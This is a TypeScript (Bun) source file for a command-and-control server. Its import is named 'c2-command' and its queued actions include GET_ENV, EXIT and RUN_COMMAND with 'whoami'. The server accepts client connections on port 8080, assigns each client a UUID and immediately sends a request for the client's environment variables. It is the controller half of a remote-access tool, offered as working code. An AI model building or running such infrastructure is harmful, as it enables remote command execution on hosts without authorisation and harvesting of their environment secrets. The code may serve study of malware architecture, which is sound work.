import { ActionType, Command } from './c2-command'
import type { Socket } from 'bun'

const commands = [
  Command.fromAction(ActionType.EXIT),
  Command.fromAction(ActionType.GET_ENV),
  new Command(ActionType.RUN_COMMAND, { foo: 'bar' }),
  new Command(ActionType.RUN_COMMAND, {
    cmd: 'whoami',
    args: null,
  }),
]

type UUID = ReturnType<typeof crypto.randomUUID>
type Connector = (id: 0 | UUID) => Promise<BaseClient>
interface Connection {
  connector: Connector
  abortController: AbortController
}

interface BaseClient {
  id: UUID
}

interface Client extends BaseClient {
  socket: Socket<unknown>
}

const clients = [] as Client[]
const inboundConnections = new Map<string, Connection>()
const uuidRegex =
  /[A-z,0-9]{8}\-[A-z,0-9]{4}-[A-z,0-9]{4}-[A-z,0-9]{4}-[A-z,0-9]{12}/

Bun.listen({
  hostname: '127.0.0.1',
  port: 8080,
  socket: {
    data(socket, data) {
      const id =
        data.byteLength === 1
          ? data.readUint8(0)
          : (data.toString('ascii', 0, 36) as UUID)

      const combo = `${socket.remoteAddress}:${socket.localPort}`
      const matchZero = typeof id === 'number' && id === 0
      const matchUUID = typeof id === 'string' && uuidRegex.test(id)
      if (matchZero || matchUUID) {
        inboundConnections
          .get(combo)
          ?.connector(id)
          .then((client) => {
            clients.push({
              ...client,
              socket,
            })

            console.info(
              `(8080): ${socket.remoteAddress} connected as "${client.id}."`
            )
            const buffer = Command.fromAction(ActionType.GET_ENV).toBuffer()
            socket.write(buffer)
          })
          .catch(() => {
            console.info(`(8080): ${socket.remoteAddress} failed to connect.`)
            socket.end('fail')
          })
      }

      inboundConnections.delete(combo)
    }, // message received from client
    open(socket) {
      console.info(`(8080): ${socket.remoteAddress} connected`)
      const abortController = new AbortController()

      const connector = (id: 0 | UUID) =>
        new Promise<BaseClient>((res, rej) => {
          if (abortController.signal.aborted) rej()
          abortController.signal.onabort = () => rej()

          res({
            id: id === 0 ? crypto.randomUUID() : id,
          })
        })

      const combo = `${socket.remoteAddress}:${socket.localPort}`
      setTimeout(() => {
        abortController.abort()
        if (inboundConnections.has(combo)) {
          inboundConnections.delete(combo)
          console.info(
            `(8080): ${socket.remoteAddress} did not respond in time.`
          )
          socket.end('timeout')
        }
      }, 10000)

      // Abort any pending connection from this address and port combo
      inboundConnections.get(combo)?.abortController.abort()

      // Add pending connection
      inboundConnections.set(combo, {
        abortController,
        connector,
      })
    }, // socket opened
    close(socket) {}, // socket closed
    drain(socket) {}, // socket ready for more data
    error(socket, error) {
      console.log(`ERR (${socket.remoteAddress}): ${error}`)
    }, // error handler
  },
})
